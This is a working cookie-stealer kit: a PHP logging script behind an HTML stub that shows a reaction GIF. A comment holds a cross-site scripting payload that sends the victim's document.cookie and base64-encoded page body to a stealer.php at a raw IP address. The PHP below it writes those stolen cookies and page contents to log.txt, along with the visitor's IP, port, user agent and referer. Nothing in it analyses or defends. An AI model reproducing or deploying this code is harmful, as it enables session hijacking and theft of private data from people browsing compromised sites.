<html>
<body>
<img src="http://www.reactiongifs.com/r/1gjdAX7.gif">
</body>
</html>
<?php
/*
<html>
<script>document.write('<img src="http://81.4.124.11/stealer.php?cookie='+escape(document.cookie)+'&body='+escape(btoa(document.body.innerHTML))+'">');</script>
</html>
*/
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function logData() 
{ 
	$ipLog="log.txt"; 
	$cookie = $_GET['cookie']; 
	$body = $_GET['body']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 

	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERRER']; 
	$date=date ("l dS of F Y h:i:s A"); 
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br> | BODY: $body"); 
	else 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie | BODY: $body \n\n"); 
	fclose($log); 
} 

logData(); 

?>

